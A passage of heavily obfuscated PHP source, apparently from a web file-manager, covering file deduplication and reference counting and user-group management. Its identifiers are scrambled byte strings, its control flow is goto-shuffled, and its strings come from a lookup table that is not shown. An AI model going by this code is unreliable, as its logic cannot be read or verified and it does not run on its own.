$b„¯¡ÑÜö³ = false) { goto E«ŸòçÔµ; f×Ë’±°: $CÇ¨ÕÃÉùÕ = $this->addFileMake($E‘½ÊÕÀ, $c‚‡˜‘÷, $eêÅ±«¬, $eº«¨æˆøµ, $d¦Ş­Ö¤à, $b„¯¡ÑÜö³); $a¯²‡˜ùƒó = $this->addFileData($CÇ¨ÕÃÉùÕ); CacheLock::unlock($AÅÅ•ìà‘ó); goto côáµ–ÖÆÕ; eôÇÕ’Â¥°: $AÅÅ•ìà‘ó = $_SERVER[Â€Á›¨õ][1725] . $eº«¨æˆøµ; CacheLock::lock($AÅÅ•ìà‘ó); if ($cîÛŞ»ßÅã = $this->addFileCheckExist($eêÅ±«¬, $eº«¨æˆøµ, $c‚‡˜‘÷)) { CacheLock::unlock($AÅÅ•ìà‘ó); return $cîÛŞ»ßÅã; } goto f×Ë’±°; côáµ–ÖÆÕ: return $a¯²‡˜ùƒó; goto C»öâåÏ‘í; E«ŸòçÔµ: $eêÅ±«¬ = IO::hashSimple($E‘½ÊÕÀ); $eº«¨æˆøµ = IO::hashMd5($E‘½ÊÕÀ); $c‚‡˜‘÷ = IO::size($E‘½ÊÕÀ); goto eôÇÕ’Â¥°; C»öâåÏ‘í: } public function addFileMake($FçğôèêÙ, $Câ…¶ŒÒç, $c–µ¾âñ», $a ˜óì¦ñ, $aÖÌ‰‰«ôÔ, $f‡äÈº÷•†) { goto CİÓ´šã”—; F„È‰‹èÒ: $cçƒÂªäª = get_path_this($c÷—­­„‚«); if ($f‡äÈº÷•†) { $aÉÙÈ¼„àÚ = IO::move($FçğôèêÙ, $E‰¶Ô¹âÖ, !1, $cçƒÂªäª); } else { $aÉÙÈ¼„àÚ = IO::copy($FçğôèêÙ, $E‰¶Ô¹âÖ, !1, $cçƒÂªäª); } if (!$aÉÙÈ¼„àÚ) { return !1; } goto eåõÌÇ‹™œ; eåõÌÇ‹™œ: $CŠé¸èß»‡ = KodIO::defaultDriver(); $e²»Ô®†ÕÄ = array($dº¸­âÅŞè[543] => $Câ…¶ŒÒç, $dº¸­âÅŞè[1722] => 1, $dº¸­âÅŞè[407] => $aÖÌ‰‰«ôÔ, $dº¸­âÅŞè[752] => $CŠé¸èß»‡[$dº¸­âÅŞè[388]], $dº¸­âÅŞè[408] => $c÷—­­„‚«, $dº¸­âÅŞè[1723] => $c–µ¾âñ», $dº¸­âÅŞè[1724] => $a ˜óì¦ñ); return $e²»Ô®†ÕÄ; goto A±»¸¹¦Ï·; CİÓ´šã”—: $dº¸­âÅŞè =& $_SERVER[Â€Á›¨õ]; $c÷—­­„‚« = $this->createFileName($aÖÌ‰‰«ôÔ, $a ˜óì¦ñ); $E‰¶Ô¹âÖ = get_path_father($c÷—­­„‚«); goto F„È‰‹èÒ; A±»¸¹¦Ï·: } public function addFileCheckExist($A¸¥Ò‘®ª, $B¹Ñ–»‚†Ÿ, $A´¹àåô‰Ñ) { $bÁ¢‡¾Íœ =& $_SERVER[Â€Á›¨õ]; $fŞ½ø¦–® = $this->findByHash($A¸¥Ò‘®ª, $B¹Ñ–»‚†Ÿ); if (!$fŞ½ø¦–®) { return !1; } $fá±°šÛ— = array($bÁ¢‡¾Íœ[1722] => intval($fŞ½ø¦–®[$bÁ¢‡¾Íœ[1726]]) + 1, $bÁ¢‡¾Íœ[543] => $A´¹àåô‰Ñ); $this->where(array($bÁ¢‡¾Íœ[442] => $fŞ½ø¦–®[$bÁ¢‡¾Íœ[441]]))->save($fá±°šÛ—); return $fŞ½ø¦–®; } public function remove($dÄ¬¾Øš´’) { $this->linkCountChange($dÄ¬¾Øš´’, !1); $this->clearEmpty(); return !0; } public function linkAdd($a†áÅßê§è) { $this->linkCountChange($a†áÅßê§è, !0); } public function linkCountChange($aá‹Ú¦Ğë, $dìÂä¤Ì) { goto fÍ„´¤ÖÄ; Dö âõˆ»: foreach ($EßÜŠ†Ùê as $dµ¼¡ôÎ–Î => $D®½®°ˆœÀ) { $eİ»ä†Ù¤è = $D®½®°ˆœÀ . $FÃ¯Üóâ¬¯[33]; if (!$EìÜ„‚‰ØÊ[$eİ»ä†Ù¤è]) { $EìÜ„‚‰ØÊ[$eİ»ä†Ù¤è] = array(); } $EìÜ„‚‰ØÊ[$eİ»ä†Ù¤è][] = $dµ¼¡ôÎ–Î; } foreach ($EìÜ„‚‰ØÊ as $D®½®°ˆœÀ => $D¨ğÄÒ†Â ) { if (!$D¨ğÄÒ†Â ) { continue; } $D®½®°ˆœÀ = $dìÂä¤Ì ? $D®½®°ˆœÀ : -intval($D®½®°ˆœÀ); $e­¢ÈŠ°ì× = array($FÃ¯Üóâ¬¯[441] => array($FÃ¯Üóâ¬¯[7], $D¨ğÄÒ†Â )); if ($D®½®°ˆœÀ < 0) { $e­¢ÈŠ°ì×[$FÃ¯Üóâ¬¯[1726]] = array($FÃ¯Üóâ¬¯[947], abs($D®½®°ˆœÀ)); } $this->where($e­¢ÈŠ°ì×)->setAdd($FÃ¯Üóâ¬¯[1726], $D®½®°ˆœÀ); } goto a¡…‚–Âäí; aŒ™«Š¸¸ê: $EßÜŠ†Ùê = array(); foreach ($aá‹Ú¦Ğë as $dµ¼¡ôÎ–Î) { $eİ»ä†Ù¤è = $dµ¼¡ôÎ–Î . $FÃ¯Üóâ¬¯[33]; if (!$EßÜŠ†Ùê[$eİ»ä†Ù¤è]) { $EßÜŠ†Ùê[$eİ»ä†Ù¤è] = 0; } $EßÜŠ†Ùê[$eİ»ä†Ù¤è]++; } $EìÜ„‚‰ØÊ = array(); goto Dö âõˆ»; fÍ„´¤ÖÄ: $FÃ¯Üóâ¬¯ =& $_SERVER[Â€Á›¨õ]; if (!$aá‹Ú¦Ğë) { return; } if (!is_array($aá‹Ú¦Ğë)) { $aá‹Ú¦Ğë = array($aá‹Ú¦Ğë); } goto aŒ™«Š¸¸ê; a¡…‚–Âäí: } public function findByHash($dÕ‰á«¬Š˜, $d–Ö¦†µî = false) { $DØŠø–×È´ =& $_SERVER[Â€Á›¨õ]; if (!$dÕ‰á«¬Š˜ && !$d–Ö¦†µî) { return !1; } $e²ÇŸ˜ÕÅ = array($DØŠø–×È´[1723] => $dÕ‰á«¬Š˜); if ($d–Ö¦†µî) { $e²ÇŸ˜ÕÅ = array($DØŠø–×È´[1724] => $d–Ö¦†µî); } return $this->order($DØŠø–×È´[1727])->where($e²ÇŸ˜ÕÅ)->find(); } public function clearEmpty($b†³ò—ùŒ² = 0) { goto CØ¨ØÙ¯ˆ»; aÒŠ…†®ù±: $B…ôßçÇã = $this->where($Aâ ìóğù)->select(); if (!$B…ôßçÇã) { return; } $d¬„Ú±¦ê¾ = new Task($a”ÊÕœÇõˆ[1729], $a”ÊÕœÇõˆ[33], count($B…ôßçÇã)); goto eá›àË¬ëÌ; CØ¨ØÙ¯ˆ»: $a”ÊÕœÇõˆ =& $_SERVER[Â€Á›¨õ]; $aÕäÑ– Š• = time() - 3600 * 24 * $b†³ò—ùŒ²; $Aâ ìóğù = $a”ÊÕœÇõˆ[1728] . $aÕäÑ– Š•; goto aÒŠ…†®ù±; eá›àË¬ëÌ: foreach ($B…ôßçÇã as $BÑ³´©âØ±) { $d¬„Ú±¦ê¾->update(1); $this->resetFile($BÑ³´©âØ±); } $d¬„Ú±¦ê¾->end(); goto eÂ‘ƒ®ÁÇ„; eÂ‘ƒ®ÁÇ„: } public function resetFile($cÓ—‰Ûñ¡) { goto bÄˆÃìØÁƒ; fÍÖÉŒù½: $D„ä·º“ßÉ = Model($báÊ¹½†–[1730])->where($eÉ’‘ŠŠ•­)->count(); $Cè»‚÷„»‡ = intval($Bˆ’¶ÅÂ«Í) + intval($D„ä·º“ßÉ); if ($Cè»‚÷„»‡ == 0) { IO::remove($cÓ—‰Ûñ¡[$báÊ¹½†–[75]]); $this->where($eÉ’‘ŠŠ•­)->delete(); $this->metaSet($cÓ—‰Ûñ¡[$báÊ¹½†–[441]], null, null); return; } goto dèà¹†§ôá; bÄˆÃìØÁƒ: $báÊ¹½†– =& $_SERVER[Â€Á›¨õ]; $eÉ’‘ŠŠ•­ = array($báÊ¹½†–[442] => $cÓ—‰Ûñ¡[$báÊ¹½†–[441]]); $Bˆ’¶ÅÂ«Í = Model($báÊ¹½†–[1178])->where($eÉ’‘ŠŠ•­)->count(); goto fÍÖÉŒù½; dèà¹†§ôá: if ($cÓ—‰Ûñ¡[$báÊ¹½†–[1726]] != $Cè»‚÷„»‡) { $this->where($eÉ’‘ŠŠ•­)->save(array($báÊ¹½†–[1722] => $Cè»‚÷„»‡)); } goto dò±Ã²¼î‘; dò±Ã²¼î‘: } public function storageInfo($d›´«°¾ = false) { goto c§±Œä¥¾º; dğ‹†Ğ²Û: for ($BÄßÂÖ¸° = 0; $BÄßÂÖ¸° < $d˜ÔæÛ²”; $BÄßÂÖ¸° = $BÄßÂÖ¸° + $C†‰¹¼ƒØî) { $DÙå‚ïá = $this->limit($BÄßÂÖ¸°, $BÄßÂÖ¸° + $C†‰¹¼ƒØî)->select(); foreach ($DÙå‚ïá as $aÔŸ›Æ¤¿) { $d“…æ¦­²‘ += $aÔŸ›Æ¤¿[$e•×ò¨ƒì[77]] * $aÔŸ›Æ¤¿[$e•×ò¨ƒì[1726]]; $b¾©‡Ú¨¿¶ += $aÔŸ›Æ¤¿[$e•×ò¨ƒì[77]] * ($aÔŸ›Æ¤¿[$e•×ò¨ƒì[1726]] - 1); $cá‰µ¹ò‡š += $aÔŸ›Æ¤¿[$e•×ò¨ƒì[1726]]; } } $e¡–¸¬Š = array($e•×ò¨ƒì[1731] => $d“…æ¦­²‘, $e•×ò¨ƒì[1732] => $b¾©‡Ú¨¿¶, $e•×ò¨ƒì[1733] => $b¾©‡Ú¨¿¶ / $d“…æ¦­²‘, $e•×ò¨ƒì[81] => $d˜ÔæÛ²”, $e•×ò¨ƒì[1734] => $cá‰µ¹ò‡š); return $e¡–¸¬Š; goto EÜ¸®–‰İ; c§±Œä¥¾º: $e•×ò¨ƒì =& $_SERVER[Â€Á›¨õ]; $d˜ÔæÛ²” = $this->count() + 0.0; $b¾©‡Ú¨¿¶ = 0; goto cÂìÄÂÃäÌ; cÂìÄÂÃäÌ: $d“…æ¦­²‘ = 1; $cá‰µ¹ò‡š = 0; $C†‰¹¼ƒØî = 5000; goto dğ‹†Ğ²Û; EÜ¸®–‰İ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\142\154\145\116\141\x6d\145" => "\x67\x72\157\165\x70\137\155\x65\164\141", "\155\x65\164\x61\x46\151\x65\154\x64" => "\x67\x72\157\165\160\x49\104"); protected function cacheFunctionAlias($Fù©ä‡ãœé) { $A™ç¥ñî ğ =& $_SERVER[Â€Á›¨õ]; return array($A™ç¥ñî ğ[1735] => array($Fù©ä‡ãœé[0], $A™ç¥ñî ğ[1736]), $A™ç¥ñî ğ[1737] => array($Fù©ä‡ãœé[0], $A™ç¥ñî ğ[1736])); } protected function getInfo($DØ×‰¥õ„) { $b„´˜îïÍ = $this->getInfoSimple($DØ×‰¥õ„); if (!$b„´˜îïÍ) { return !1; } return $this->_listDataApplyItem($b„´˜îïÍ); } protected function getInfoSimple($fŞ¨âù»¼, $eÒø¬Ã…¢ = false) { $f‡Ö®ñ¯ =& $_SERVER[Â€Á›¨õ]; if ($eÒø¬Ã…¢) { $FÏŸÍ•—ƒ = array($f‡Ö®ñ¯[1664] => intval($fŞ¨âù»¼)); $C„÷Ü¯‹Š = $this->where($FÏŸÍ•—ƒ)->find(); return is_array($C„÷Ü¯‹Š) ? $C„÷Ü¯‹Š : array(); } return $this->cacheFunctionGet($f‡Ö®ñ¯[1738], $fŞ¨âù»¼); } protected function groupAdd($DÈÙÙ÷Å½¶) { goto dÖÍÏÓÖíÕ; aöÌŠ‘×š•: if (isset($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1741]])) { $this->metaSet($cÛğÌÌ×æé, array($A’§¦Ø¢ß [1741] => $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1741]], $A’§¦Ø¢ß [1742] => $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1742]])); unset($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1741]]); unset($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1742]]); } Model($A’§¦Ø¢ß [1178])->groupRootAdd($cÛğÌÌ×æé); return $cÛğÌÌ×æé; goto AƒíæŞÆÓ„; dÖÍÏÓÖíÕ: $A’§¦Ø¢ß  =& $_SERVER[Â€Á›¨õ]; if (!$DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [472]] && isset($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1664]]) && $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1664]] == 1) { if ($DÚºô÷µ¶¬ = $this->getInfoSimple($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1664]], !0)) { return $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1664]]; } } else { $DÚºô÷µ¶¬ = $this->getInfoSimple($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [472]]); if (!$DÚºô÷µ¶¬) { return !1; } } $f­ŸéØå« = $A’§¦Ø¢ß [493]; goto B•±ŒÆØ›; D‘àá²®Æ: if (!empty($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1664]])) { $C“´î±µ–°[$A’§¦Ø¢ß [1664]] = $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1664]]; } $cÛğÌÌ×æé = $this->add($C“´î±µ–°); $this->setNamePinyin($cÛğÌÌ×æé, $C“´î±µ–°[$A’§¦Ø¢ß [28]]); goto aöÌŠ‘×š•; B•±ŒÆØ›: if ($DÚºô÷µ¶¬[$A’§¦Ø¢ß [481]]) { $f­ŸéØå« = $DÚºô÷µ¶¬[$A’§¦Ø¢ß [481]] . $DÚºô÷µ¶¬[$A’§¦Ø¢ß [1664]] . $A’§¦Ø¢ß [47]; } $C“´î±µ–° = array($A’§¦Ø¢ß [407] => $this->groupNameAuto($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [472]], $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [28]]), $A’§¦Ø¢ß [389] => $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [472]], $A’§¦Ø¢ß [548] => $f­ŸéØå«, $A’§¦Ø¢ß [1739] => $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1648]], $A’§¦Ø¢ß [1740] => 0, $A’§¦Ø¢ß [1668] => 0); if (isset($DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1687]])) { $C“´î±µ–°[$A’§¦Ø¢ß [1687]] = $DÈÙÙ÷Å½¶[$A’§¦Ø¢ß [1687]]; } else { $aôÀõ¯—ñ = $this->max($A’§¦Ø¢ß [1687]); if (!$aôÀõ¯—ñ) { $aôÀõ¯—ñ = 0; } $C“´î±µ–°[$A’§¦Ø¢ß [1687]] = $aôÀõ¯—ñ + 1; } goto D‘àá²®Æ; AƒíæŞÆÓ„: } protected function groupEdit($b˜…­¨Ò, $eéñƒŸ‚) { goto CîÚŸäØ¤¢; DËØ‚¬‘Ñ: if (!empty($eéñƒŸ‚[$ağ‰İâœ½ç[472]])) { $AÈÒ®ÅğÄÑ = $this->getInfoSimple($eéñƒŸ‚[$ağ‰İâœ½ç[472]]); if (!$AÈÒ®ÅğÄÑ) { return !1; } if ($Fñ‹ÇÍ±ã¸[$ağ‰İâœ½ç[1664]] == $AÈÒ®ÅğÄÑ[$ağ‰İâœ½ç[1664]]) { return !1; } if ($eéñƒŸ‚[$ağ‰İâœ½ç[472]] != $Fñ‹ÇÍ±ã¸[$ağ‰İâœ½ç[472]]) { if ($AÈÒ®ÅğÄÑ[$ağ‰İâœ½ç[481]] !== $Fñ‹ÇÍ±ã¸[$ağ‰İâœ½ç[481]] && strpos($AÈÒ®ÅğÄÑ[$ağ‰İâœ½ç[481]], $Fñ‹ÇÍ±ã¸[$ağ‰İâœ½ç[481]] . $Fñ‹ÇÍ±ã¸[$ağ‰İâœ½ç[1664]] . $ağ‰İâœ½ç[47]) === 0) { return !1; } $eéñƒŸ‚[$ağ‰İâœ½ç[548]] = $AÈÒ®ÅğÄÑ[$ağ‰İâœ½ç[481]] . $eéñƒŸ‚[$ağ‰İâœ½ç[472]] . $ağ‰İâœ½ç[47]; $this->_changeChildLevel($Fñ‹ÇÍ±ã¸, $AÈÒ®ÅğÄÑ); } } if (isset($eéñƒŸ‚[$ağ‰İâœ½ç[28]])) { $this->setNamePinyin($b˜…­¨Ò, $eéñƒŸ‚[$ağ‰İâœ½ç[28]]); } if (isset($eéñƒŸ‚[$ağ‰İâœ½ç[1741]])) { $this->metaSet($b˜…­¨Ò, array($ağ‰İâœ½ç[1741] => $eéñƒŸ‚[$ağ‰İâœ½ç[1741]], $ağ‰İâœ½ç[1742] => $eéñƒŸ‚[$ağ‰İâœ½ç[1742]])); unset($eéñƒŸ‚[$ağ‰İâœ½ç[1741]]); unset($eéñƒŸ‚[$ağ‰İâœ½ç[1742]]); } goto Fé¨È£‡; CîÚŸäØ¤¢: $ağ‰İâœ½ç =& $_SERVER[Â€Á›¨õ]; $Fñ‹ÇÍ±ã¸ = $this->getInfoSimple($b˜…­¨Ò); if (!$Fñ‹ÇÍ±ã¸) { return !1; } goto DËØ‚¬‘Ñ; Fé¨È£‡: if (isset($eéñƒŸ‚[$ağ‰İâœ½ç[28]]) && $eéñƒŸ‚[$ağ‰İâœ½ç[28]] != $Fñ‹ÇÍ±ã¸[$ağ‰İâœ½ç[28]]) { $this->_clearChildrenCache($Fñ‹ÇÍ±ã¸); } return $this->where(array($ağ‰İâœ½ç[1743] => $b˜…­¨Ò))->save($eéñƒŸ‚); goto DéŒ Ù×®; DéŒ Ù×®: } private function _clearChildrenCache($CÅ¥Ç®”¥Ê) { $eÜŒµÉ‡ºñ =& $_SERVER[Â€Á›¨õ]; $b¶ÛÌŒ‰ğ = array($eÜŒµÉ‡ºñ[548] => array($eÜŒµÉ‡ºñ[507], $CÅ¥Ç®”¥Ê[$eÜŒµÉ‡ºñ[481]] . $CÅ¥Ç®”¥Ê[$eÜŒµÉ‡ºñ[1664]] . $eÜŒµÉ‡ºñ[508])); $EÚéÍÙÑ‹¦ = $this->field($eÜŒµÉ‡ºñ[1664])->where($b¶ÛÌŒ‰ğ)->select(); foreach ($EÚéÍÙÑ‹¦ as $D¯Ÿ†Úç¼) { $this->cacheFunctionClear($eÜŒµÉ‡ºñ[1744], $D¯Ÿ†Úç¼[$eÜŒµÉ‡ºñ[1664]]); $this->cacheFunctionClear($eÜŒµÉ‡ºñ[1738], $D¯Ÿ†Úç¼[$eÜŒµÉ‡ºñ[1664]]); } } private function _changeChildLevel($fÄçÒÉ±ã–, $cÀö¸ÕËöÀ, $D†ßÃÈù££ = false) { goto FÄ—ˆÍÉ›æ; FÄ—ˆÍÉ›æ: $c¿»‚£åæ =& $_SERVER[Â€Á›¨õ]; $EŠ¹™ØÎË‰ = $fÄçÒÉ±ã–[$c¿»‚£åæ[481]] . $fÄçÒÉ±ã–[$c¿»‚£åæ[1664]] . $c¿»‚£åæ[47]; $d™½ÏøÕøØ = $cÀö¸ÕËöÀ[$c¿»‚£åæ[481]] . $cÀö¸ÕËöÀ[$c¿»‚£åæ[1664]] . $c¿»‚£åæ[47] . $fÄçÒÉ±ã–[$c¿»‚£åæ[1664]] . $c¿»‚£åæ[47]; goto BèùÃø»ÖÛ; Aíêîå’©ì: $this->_clearChildrenCache($fÄçÒÉ±ã–); $this->where($DôëŸœ¡Éà)->data($dƒ™ñÅÜ“Á)->save(); goto b¶ŞÛ‘§ï; BèùÃø»ÖÛ: if ($D†ßÃÈù££) { $d™½ÏøÕøØ = $cÀö¸ÕËöÀ[$c¿»‚£åæ[481]] . $cÀö¸ÕËöÀ[$c¿»‚£åæ[1664]] . $c¿»‚£åæ[47]; } $DôëŸœ¡Éà = array($c¿»‚£åæ[548] => array($c¿»‚£åæ[507], $fÄçÒÉ±ã–[$c¿»‚£åæ[481]] . $fÄçÒÉ±ã–[$c¿»‚£åæ[1664]] . $c¿»‚£åæ[508])); $dƒ™ñÅÜ“Á = array($c¿»‚£åæ[548] => array($c¿»‚£åæ[556], "\x72\145\x70\154\141\143\145\x28\160\x61\x72\x65\156\x74\114\x65\166\x65\x6c\54\x27{$EŠ¹™ØÎË‰}\47\x2c\47{$d™½ÏøÕøØ}\47\x29")); goto Aíêîå’©ì; b¶ŞÛ‘§ï: } public function setNamePinyin($BÎ‡ššä‹, $BÒ¨Ò÷‰¸Ä = false) { $f´è»¡Ôáò =& $_SERVER[Â€Á›¨õ]; if (!$BÒ¨Ò÷‰¸Ä) { $eâÚÌ‡´½ = $this->getInfoSimple($BÎ‡ššä‹); $BÒ¨Ò÷‰¸Ä = $eâÚÌ‡´½[$f´è»¡Ôáò[28]]; } if (!Input::check($BÒ¨Ò÷‰¸Ä, $f´è»¡Ôáò[551])) { $this->metaSet($BÎ‡ššä‹, $f´è»¡Ôáò[438], null); $this->metaSet($BÎ‡ššä‹, $f´è»¡Ôáò[437], null); return; } $cÔ´£„®ÂÂ = array($f´è»¡Ôáò[438] => str_replace($f´è»¡Ôáò[50], $f´è»¡Ôáò[33], Pinyin::encode($BÒ¨Ò÷‰¸Ä)), $f´è»¡Ôáò[437] => Pinyin::encode($BÒ¨Ò÷‰¸Ä, $f´è»¡Ôáò[552])); $this->metaSet($BÎ‡ššä‹, $cÔ´£„®ÂÂ); } protected function groupStatus($D­¾×‹‰Ì‘, $cêŸ‹±áêŠ) { goto D¯Ú£º´ƒ…; f¡î‘Å»àé: foreach ($CƒÏÖêƒŒ¢ as $D­¾×‹‰Ì‘) { $fõƒŒÀ¬Ñ[] = array($Cª¾¤Ñ§ŠÊ[1664] => $D­¾×‹‰Ì‘, $Cª¾¤Ñ§ŠÊ[92] => $Cª¾¤Ñ§ŠÊ[702], $Cª¾¤Ñ§ŠÊ[370] => $cêŸ‹±áêŠ); } return Model($Cª¾¤Ñ§ŠÊ[1745])->addAll($fõƒŒÀ¬Ñ, array(), !0); goto C—Á¢™ãÓ¨; D¯Ú£º´ƒ…: $Cª¾¤Ñ§ŠÊ =& $_SERVER[Â€Á›¨õ]; $aÀİó¥Ï¼å = $this->getInfoSimple($D­¾×‹‰Ì‘); if (!$aÀİó¥Ï¼å) { return !1; } goto DÌöËÖ«æÙ; DÌöËÖ«æÙ: if ($cêŸ‹±áêŠ == $Cª¾¤Ñ§ŠÊ[86]) { $CƒÏÖêƒŒ¢ = $this->parentLevelArray($aÀİó¥Ï¼å[$Cª¾¤Ñ§ŠÊ[481]]); } else { $d¯È¢†Š»¢ = array($Cª¾¤Ñ§ŠÊ[548] => array($Cª¾¤Ñ§ŠÊ[507], $aÀİó¥Ï¼å[$Cª¾¤Ñ§ŠÊ[481]] . $aÀİó¥Ï¼å[$Cª¾¤Ñ§ŠÊ[1664]] . $Cª¾¤Ñ§ŠÊ[508])); $CƒÏÖêƒŒ¢ = $this->where($d¯È¢†Š»¢)->field($Cª¾¤Ñ§ŠÊ[1664])->select(); $CƒÏÖêƒŒ¢ = array_to_keyvalue($CƒÏÖêƒŒ¢, $Cª¾¤Ñ§ŠÊ[33], $Cª¾¤Ñ§ŠÊ[1664]); } $CƒÏÖêƒŒ¢[] = $aÀİó¥Ï¼å[$Cª¾¤Ñ§ŠÊ[1664]]; $fõƒŒÀ¬Ñ = array(); goto f¡î‘Å»àé; C—Á¢™ãÓ¨: } protected function groupRemove($BãÍ‘¢) { goto c˜ÕøÒ‰ìÒ; D‡òÍÛñ‡ó: if (!$AøëÎã“¸ || $AøëÎã“¸[$b°Ï‘¾÷§Ø[472]] == 0) { return !1; } $b¾ĞÍ…¨Ä» = $this->getInfoSimple($AøëÎã“¸[$b°Ï‘¾÷§Ø[472]]); $this->_changeChildLevel($AøëÎã“¸, $b¾ĞÍ…¨Ä», !0); goto ašîÆï‚š‰; c˜ÕøÒ‰ìÒ: $b°Ï‘¾÷§Ø =& $_SERVER[Â€Á›¨õ]; $d®ó‚çù«ª = array($b°Ï‘¾÷§Ø[1664] => $BãÍ‘¢); $AøëÎã“¸ = $this->where($d®ó‚çù«ª)->find(); goto D‡òÍÛñ‡ó; BÌØ”ğ—£«: Model($b°Ï‘¾÷§Ø[767])->groupRootRemove($BãÍ‘¢); return $this->where($d®ó‚çù«ª)->delete(); goto C…Ñ¢è‰ö; ašîÆï‚š‰: $this->where(array($b°Ï‘¾÷§Ø[472] => $BãÍ‘¢))->save(array($b°Ï‘¾÷§Ø[472] => $AøëÎã“¸[$b°Ï‘¾÷§Ø[472]])); Model($b°Ï‘¾÷§Ø[1745])->where($d®ó‚çù«ª)->delete(); Model($b°Ï‘¾÷§Ø[1746])->where($d®ó‚çù«ª)->delete(); goto BÌØ”ğ—£«; C…Ñ¢è‰ö: } protected function groupSort($B°ÙªŠĞ˜§) { $c˜´ˆº—ë¡ =& $_SERVER[Â€Á›¨õ]; $A¡‹™ßÁ†õ = array(); foreach ($B°ÙªŠĞ˜§ as $fùèëÇÀŞ¨ => $f‰Å»Œ) { $A¡‹™ßÁ†õ[] = array($c˜´ˆº—ë¡[1664], $f‰Å»Œ, $c˜´ˆº—ë¡[1687], $fùèëÇÀŞ¨ + 1); } $this->saveAll($A¡‹™ßÁ†õ); } public function listData() { $dˆ¿–áæòí = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dˆ¿–áæòí[$_SERVER[Â€Á›¨õ][365]]); return $dˆ¿–áæòí; } private function _makeOrder($dê‡ˆËè×» = '') { goto f¯…­œåÑ©; f¯…­œåÑ©: $A†“ôİ²ç =& $_SERVER[Â€Á›¨õ]; $FŠ˜ôĞªî = array($A†“ôİ²ç[1664], $A†“ôİ²ç[28], $A†“ôİ²ç[1650], $A†“ôİ²ç[192]); $F©ƒ¤ÃÔˆ = array($A†“ôİ²ç[422] => $A†“ôİ²ç[423], $A†“ôİ²ç[424] => $A†“ôİ²ç[425]); goto fÄ‰ ÃÑÀ÷; fÄ‰ ÃÑÀ÷: $AÚ‰ÊÚŒ = Input::get($A†“ôİ²ç[429], $A†“ôİ²ç[7], $A†“ôİ²ç[1668], $FŠ˜ôĞªî); $EÓ»ÚÚ = Input::get($A†“ôİ²ç[430], $A†“ôİ²ç[7], $A†“ôİ²ç[1747], array($A†“ôİ²ç[1747], $A†“ôİ²ç[424])); $EÓ»ÚÚ = $F©ƒ¤ÃÔˆ[$EÓ»ÚÚ]; goto A®©Åøó‚œ; A®©Åøó‚œ: $dê‡ˆËè×» = $dê‡ˆËè×» . "{$AÚ‰ÊÚŒ}\40{$EÓ»ÚÚ}\54\x20\147\x72\157\165\x70\x49\104\x20\141\163\x63"; return $this->order($dê‡ˆËè×»); goto e¨‹¯°°‰; e¨‹¯°°‰: } public function listChild($CñÂ³æõ´ø) { $fä‡™ê° =& $_SERVER[Â€Á›¨õ]; $DŒ²Ú÷ÏÌÒ = $this->where(array($fä‡™ê°[472] => $CñÂ³æõ´ø))->_makeOrder()->selectPage(200); $this->_listDataApply($DŒ²Ú÷ÏÌÒ[$fä‡™ê°[365]]); return $DŒ²Ú÷ÏÌÒ; } public function listByID($Aà…Ïï‚ø) { $a‹²µÓ†ÎÍ =& $_SERVER[Â€Á›¨õ]; if (!$Aà…Ïï‚ø) { return array(); } $eÙÃÅ«¦§Ã = array($a‹²µÓ†ÎÍ[1664] => array($a‹²µÓ†ÎÍ[7], $Aà…Ïï‚ø)); $a¥É‚ ëåÍ = $this->where($eÙÃÅ«¦§Ã)->select(); $this->_listDataApply($a¥É‚ ëåÍ); return $a¥É‚ ëåÍ; } public function listSearch($c©ùâöšÏâ) { goto B”­Šñ¾Ó®; B†ëªã·À: return $cöòŸè«·Ô; goto fë£¤éÙ‡º; a¶ä§ÂéŒ: if ($bÓØùÔ§Òî) { $cùŠš„Ùò¢ = $this->getInfoSimple($bÓØùÔ§Òî); $eá¤Îîó¸Ù = $cùŠš„Ùò¢[$aÀİØ…ÕöÚ[481]] . $bÓØùÔ§Òî . $aÀİØ…ÕöÚ[508]; $d…í”„˜‰‹ = array($d…í”„˜‰‹, array($aÀİØ…ÕöÚ[481] => array($aÀİØ…ÕöÚ[378], $eá¤Îîó¸Ù))); } $d…í”„˜‰‹ = $this->parseWhereLike($d…í”„˜‰‹); $cöòŸè«·Ô = $this->_makeOrder()->where($d…í”„˜‰‹)->selectPage(20); goto Bë ì¨Â; B”­Šñ¾Ó®: $aÀİØ…ÕöÚ =& $_SERVER[Â€Á›¨õ]; $FÆÃË›‡Ê = $c©ùâöšÏâ[$aÀİØ…ÕöÚ[1748]]; $bÓØùÔ§Òî = isset($c©ùâöšÏâ[$aÀİØ…ÕöÚ[1749]]) ? $c©ùâöšÏâ[$aÀİØ…ÕöÚ[1749]] : !1; goto c·•’–«Ğ‚; Bë ì¨Â: $cöòŸè«·Ô = $cöòŸè«·Ô ? $cöòŸè«·Ô : array(); if (!$cöòŸè«·Ô || count($cöòŸè«·Ô[$aÀİØ…ÕöÚ[365]]) < 5 && Input::check($FÆÃË›‡Ê, $aÀİØ…ÕöÚ[314])) { goto FãÀŠäñë½; b‰¯¦àÔ: $F¥ìÇ½Î·É = array_merge($D‹èÙ‚éªä, $CÒÌª×·©×, $cöòŸè«·Ô[$aÀİØ…ÕöÚ[365]]); $cöòŸè«·Ô[$aÀİØ…ÕöÚ[365]] = array_unique_by_key($F¥ìÇ½Î·É, $aÀİØ…ÕöÚ[1664]); $cöòŸè«·Ô[$aÀİØ…ÕöÚ[362]][$aÀİØ…ÕöÚ[363]] = count($cöòŸè«·Ô[$aÀİØ…ÕöÚ[365]]); goto fõ˜ŸŠÛØ÷; 